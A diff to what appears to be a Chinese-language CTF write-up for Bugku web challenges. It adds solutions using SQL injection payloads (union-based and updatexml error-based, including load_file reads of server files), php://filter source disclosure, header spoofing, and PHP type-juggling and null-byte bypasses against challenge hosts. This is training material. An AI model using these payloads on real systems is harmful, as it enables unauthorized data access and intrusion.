@@ -166,6 +166,10 @@ flag=67d709b2b54aa2aa648cf6e87a7114f1
 
 <br>
 
+### 头等舱
+访问页面什么都没有，然后查看响应头，发现flag
+<br>
+
 ### flag在index里
 进入页面右键源代码，发现文件包含漏洞，根据题目直接利用php://filter得到index.php源码
 `http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php`
@@ -176,6 +180,30 @@ flag=67d709b2b54aa2aa648cf6e87a7114f1
 <br>
 
 ### 前女友
+右键源代码，发现链接`<a class="link" href="code.txt" target="_blank">链接</a>`
+访问得到源码
+```php
+if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
+    $v1 = $_GET['v1'];
+    $v2 = $_GET['v2'];
+    $v3 = $_GET['v3'];
+    if($v1 != $v2 && md5($v1) == md5($v2)){
+        if(!strcmp($v3, $flag)){
+            echo $flag;
+        }
+    }
+}
+```
+```php
+http://118.89.219.210:49162/?v1[]=1&v2[]=2&v3[]=3
+当三个参数都为数组时，v1和v2进行比较，由于数组之间比较，只要key对应的value相同。则
+$v1 != $v2 // true
+由于md5()传入数组，会返回NULL，则
+(md5($v1) == md5($v2)) = (NULL == NULL) // true
+由于strcmp()传入数组，会返回NULL，则
+!strcmp($v3, $flag) = !NULL // true
+得到flag
+```
 
 <br>
 
@@ -508,7 +536,14 @@ if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
 <br>
 
 ### 你从哪里来
-应该只是修改referer,但是题目好像有点问题无法做
+修改为google的Referer即可
+```http
+GET /from.php HTTP/1.1
+Host: 120.24.86.145:9009
+Referer: https://www.google.com
+Connection: close
+Upgrade-Insecure-Requests: 1
+```
 
 <br>
 
@@ -649,11 +684,49 @@ for i in range(1, 100):
 <br>
 
 ### 这是一个神奇的登录框
+```sql
+admin_name=0"||1#&admin_passwd=    # 回显用户名信息
+admin_name=0"||1 order by 3#&admin_passwd= # 报错
+admin_name=0"||1 order by 2#&admin_passwd=  # 列数为2
+admin_name=0" union select database(),2 #&admin_passwd=   # bugkusql1
+admin_name=0" union select group_concat(table_name),2 from information_schema.tables where table_schema= 0x6275676b7573716c31 #&admin_passwd=         # flag1,whoami
+admin_name=0" union select group_concat(column_name),2 from information_schema.columns where table_name= 0x666c616731 #&admin_passwd=  # flag1
+admin_name=0" union select flag1,2 from flag1 #&admin_passwd=   # 得到flag
 
+" 利用报错注入也能完成，因为报错信息没有被关闭
+```
 <br>
 
 ### 多次
+```sql
+http://120.24.86.145:9004/Once_More.php?id=9999' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = 0x776562313030322d32 ),1),1) %23
+class,flag2
+http://120.24.86.145:9004/Once_More.php?id=9999' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name =0x666c616732 ),1),1) %23
+flag2,address
+http://120.24.86.145:9004/Once_More.php?id=9999' and updatexml(1,concat(0x7e,(select group_concat(address) from flag2 ),1),1) %23
+http://120.24.86.145:9004/Once_More.php?id=9999' and updatexml(1,concat(0x7e,(select group_concat(flag2) from flag2 ),1),1) %23
+./Have_Fun.php
 
+```
+```
+Sorry,Only IP:192.168.0.100 Can Access This Site
+GET /Have_Fun.php HTTP/1.1
+Host: 120.24.86.145:9004
+CLIENT-IP: 192.168.0.100
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Cookie: PHPSESSID=kup3c61asesap930inhocglh7tdgohi0
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+
+```
+
+```
+你……你……你可以看到我? 好吧，我来自于ErWeiMa.php 顺便告诉你两个密码 one:参数名是game; tow:flag在admin里 对了,文件后@…c=Y&$as%_=#*ad…*@#！*&@…c……
+```
 <br>
 
 ### PHP_encrypt_1(ISCCCTF)
@@ -707,11 +780,36 @@ Connection: close
 
 <br>
 
-### Web2
+### 报错注入
+```sql
+被过滤的字符
+union||mid||空格||单引号||双引号||- -
+
+判断注入点
+?id=1
+?id=0
+?id=0||1   # 页面回显id=1的界面
+
+得到数据
+?id=1||updatexml(1,concat(0x7e,database(),0x7e),1)      #sql4
+
+根据提示得到文件内容，由于报错函数每次报出的字符有限制，所以分割字符串来爆出
+?id=1||updatexml(1,concat(0x7e,(substr(load_file(0x2f7661722f746573742f6b65795f312e706870),1,30)),0x7e),1)
+
+注意: <?php 部分需要查看源代码才能查看
+最后拼得文件内容如下
+<?php fdsafasfdsafidsafdsaifdsakfdsaifdsafdsafdsafdsafkdsa;fdsafdsafsdafdsafas0hfdsg9Flag:"7249f5a7fd1de602b30e6f39aea6193a"fsdafsafdsafdsafdsafa ?>
+
+提交flag有个小坑，文件内的双引号和提交flag的双引号不同
+```
 
 <br>
 
-### Web2
+### login3
+```sql
+username=1'||1#&password=2
+username=1'||(2>1)#&password=2
+```
 
 <br>
 
@@ -773,7 +871,8 @@ if($_GET[id] == "hackerDJ")
 }
 ```
 代码中第一个条件限制了字符串经过一次URL编码后不能是hackerDJ，但是中间有进行了了urldecode()的操作，那么我们便有机可乘，只需要进行两次url编码即可。
-当发送请求的URL地址为`http://120.24.86.145:9009/10.php?id=%25%36%38%25%36%31%25%36%33%25%36%62%25%36%35%25%37%32%25%34%34%25%34%61`时，服务器接受请求后会自动的进行一次URL解码，参数会变为`%68%61%63%6b%65%72%44%4a`，并且能通过第一次验证，然后经过`urldecode()`函数在进行URL解码，`$_GET[id]==hackerDJ`，那么条件就成立，得到flag。
+请求`http://120.24.86.145:9009/10.php?id=%25%36%38%25%36%31%25%36%33%25%36%62%25%36%35%25%37%32%25%34%34%25%34%61`，服务器接受请求后会自动的进行一次URL解码，参数会变为`%68%61%63%6b%65%72%44%4a`，并且通过eregi()验证，
+然后经过`urldecode()`函数在进行URL解码，`$_GET[id]==hackerDJ`，那么条件就成立，得到flag。
 <br>
 
 ### md5()函数
@@ -792,10 +891,11 @@ if (isset($_GET['username']) and isset($_GET['password'])) {
 
 ```php
 http://120.24.86.145:9009/18.php?username[]=3&password[]=1
+服务器接受的参数实际是
 var_dump($_GET['username']) //array(1) { [0]=> string(1) "3" }
 var_dump($_GET['password']) //array(1) { [0]=> string(1) "1" }
 
-数组之间比较，只要两个数组的数量、KEY、VALUS都相同遍相等，顺序不同没关系。
+数组之间比较，如果两者key对应的value都相同,那么两者相同，其他相反。
 $_GET['username'] == $_GET['password'] //条件不满足
 
 在利用md5()传入数组会返回Null的特性
@@ -807,27 +907,191 @@ Null === Null //满足
 <br>
 
 ### 数组返回NULL绕过
+```php
+$flag = "flag";
 
+if (isset ($_GET['password'])) {
+if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
+  echo 'You password must be alphanumeric';
+else if (strpos ($_GET['password'], '--') !== FALSE)
+  die('Flag: ' . $flag);
+else
+  echo 'Invalid password';
+}
+```
+```php
+http://120.24.86.145:9009/19.php?password[]=123
+执行第一个IF, ereg()传入数组会返回为NULL，则
+NULL === False // false
+
+执行第二个IF, strpos()传入数组同样会返回为NULL，则
+NULL !== False // true
+得到flag
+```
 <br>
 
 ### sha()函数比较绕过
-
+```php
+$flag = "flag";
+if (isset($_GET['name']) and isset($_GET['password']))
+{
+  var_dump($_GET['name']);
+  echo "";
+  var_dump($_GET['password']);
+  var_dump(sha1($_GET['name']));
+  var_dump(sha1($_GET['password']));
+if ($_GET['name'] == $_GET['password'])
+  echo 'Your password can not be your name!';
+else if (sha1($_GET['name']) === sha1($_GET['password']))
+  die('Flag: '.$flag);
+else
+  echo 'Invalid password.';
+}
+else
+  echo 'Login first!';
+```
+```php
+http://120.24.86.145:9009/7.php?name[]=21&password[]=2
+执行第一个IF, 传入的两个数组内容不同，即
+$_GET['name'] == $_GET['password'] // false
+继续执行第二IF, 由于sha1()函数传入数组，会返回NULL，既
+NULL === NULL // true
+得到flag
+```
 <br>
 
-### 十六进制与数字比较
+### md5加密相等绕过
+```php
+$md51 = md5('QNKCDZO');
+$a = @$_GET['a'];
+$md52 = @md5($a);
+if(isset($a)){
+  if ($a != 'QNKCDZO' && $md51 == $md52) {
+  echo "flag{*}";
+  } else {
+  echo "false!!!";
+  }
+}
+else{
+  echo "please input a";
+}
+```
+```php
+http://120.24.86.145:9009/13.php?a=s878926199a
+传入参数和'QNKCDZO'被md5()函数加密后
+$md51 = "0e830400451993494058024219903391"
+$md52 = "0e545993274517709034328855841020"
+当两者进行比较时，在php中，如果是 0e\d+ 开头的字符串，会被作为科学计数法来解析
+0e830400451993494058024219903391 = 0*10^830400451993494058024219903391 = 0
+同理，两者相等，得到flag
 
+```
+<br>
+### 十六进制与数字比较
+```php
+error_reporting(0);
+function noother_says_correct($temp)
+{
+  $flag = 'flag{test}';
+  $one = ord('1'); //ord — 返回字符的 ASCII 码值
+  $nine = ord('9'); //ord — 返回字符的 ASCII 码值
+  $number = '3735929054';
+  // Check all the input characters!
+  for ($i = 0; $i < strlen($number); $i++)
+  {
+    // Disallow all the digits!
+    $digit = ord($temp{$i});
+    if ( ($digit >= $one) && ($digit <= $nine) )
+    {
+    // Aha, digit not allowed!
+    return "flase";
+    }
+  }
+  if($number == $temp)
+    return $flag;
+}
+
+$temp = $_GET['password'];
+echo noother_says_correct($temp);
+```
+```php
+http://120.24.86.145:9009/20.php?password=0xdeadc0de
+由于$temp中没有1-9的数字，既能通过循环验证
+当两者进行比较时，由于$temp是16进制的格式，会被解析转换为10进制，在进行比较
+($number == $temp) = ("3735929054" == "0xdeadc0de") = ("3735929054" == "3735929054") //true
+得到flag
+```
 <br>
 
 ### ereg正则%00截断
-
+```php
+$flag = "xxx";
+if (isset ($_GET['password']))
+{
+  if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
+  {
+    echo 'You password must be alphanumeric';
+  }
+  else if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999)
+  {
+    if (strpos ($_GET['password'], '-') !== FALSE) //strpos — 查找字符串首次出现的位置，找到返回字符位置，没有找到返回false
+    {
+      die('Flag: ' . $flag);
+    }
+    else
+    {
+      echo('- have not been found');
+    }
+  }
+  else
+  {
+    echo 'Invalid password';
+  }
+}
+```
+这题有个坑，给出的源码和实际的不符合，strpos的实际是`*-*`而不是`-`...
+```php
+http://120.24.86.145:9009/5.php?password=9e9%00*-*
+通过ereg()时，%00会截断，导致只会验证%00之前的字符串
+strlen($_GET['password']) < 8  传入长度实际为7个字符，%00在服务端经过url解码后算一个字符 // true
+$_GET['password'] > 9999999  由于开头0e\d+会根据科学计数法转换为数字
+9e9%00*-* = 9*10^9 > 9999999     (在和数字比较时,在9e9后面的字符串会被忽略，不列入计算中)
+最后经过strpos()时，字符串中出现了*-*字符串，则返回字符所在开始位置，则返回4, (4 !== false) //true
+得到flag
+```
+这边还有一个解法
+```php
+http://120.24.86.145:9009/5.php?password[]=1
+ereg()传入数组会返回NULL，而NULL===FALSE //false
+strlen()传入数组会返回NULL, NULL < 8 //true
+$_GET['password'] > 9999999 ，数组与数字进行比较时，都会比数字大
+strpos()传入数组会返回NULL， NULL!==FLASE // true
+得到flag
+```
 <br>
 
 ### strpos数组绕过
-
+```php
+$flag = "flag";
+if (isset ($_GET['ctf'])) {
+  if (@ereg ("^[1-9]+$", $_GET['ctf']) === FALSE)
+    echo '必须输入数字才行';
+  else if (strpos ($_GET['ctf'], '#biubiubiu') !== FALSE)
+    die('Flag: '.$flag);
+  else
+    echo '骚年，继续努力吧啊~';
+}
+```
+```php
+http://120.24.86.145:9009/15.php?ctf[]=1
+ereg()传入数组，返回NULL， NULL === FALSE //false
+strpos传入数组，返回NULL， NULL!== FALSE // true
+得到flag
+```
 <br>
 
 ## Web进阶
-
+待做...
 ### Web2
 
 <br>
